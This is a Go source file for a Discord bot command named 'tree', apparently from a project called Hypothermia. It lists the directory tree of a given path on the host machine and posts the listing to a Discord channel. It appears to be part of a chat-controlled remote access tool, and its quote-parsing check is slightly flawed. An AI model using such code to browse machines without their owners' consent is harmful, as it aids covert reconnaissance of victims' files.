package commands

import (
	"bytes"
	"fmt"
	"strconv"
	"strings"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	treeUsage string = "[path] [depth?]"

	treeFormatError string = "🟥 Expected a ending quote."
	treeArgsError   string = "🟥 Expected 1 or more arguments."
	treeGenError    string = "🟥 Error in generating tree: "
)

func (*TreeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, treeArgsError+"\nUsage: "+treeUsage, m.Reference())
		return
	}

	var path string
	var depth int
	var treeStr string

	if strings.HasPrefix(args[0], "\"") {
		joined := strings.Join(args, " ")
		start := strings.Index(joined, "\"") + 1
		end := strings.Index(joined[start:], "\"") + start

		if start == 0 || end == -1 {
			s.ChannelMessageSendReply(m.ChannelID, treeFormatError, m.Reference())
			return
		}

		path = joined[start:end]
		args = args[len(strings.Split(path, " ")):]
	}

	if len(args) > 0 {
		num, err := strconv.Atoi(args[len(args)-1])
		if err != nil {
			depth = 2
		} else {
			depth = num
		}
	}

	err := utils.GenerateTree(path, depth, 0, "", &treeStr)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(treeGenError+"%s", err), m.Reference())
		return
	}

	if len(treeStr)+10 > 1900 {
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Reference: m.Reference(),
			Files: []*discordgo.File{{
				Name:        "output.txt",
				ContentType: "text/plain",
				Reader:      bytes.NewReader([]byte(treeStr)),
			}},
		})
	} else {
		treeStr = "```\n" + treeStr + "\n```"
		s.ChannelMessageSendReply(m.ChannelID, treeStr, m.Reference())
	}
}

func (*TreeCommand) Name() string {
	return "tree"
}

func (*TreeCommand) Info() string {
	return "shows a tree of files in a directory"
}

type TreeCommand struct{}
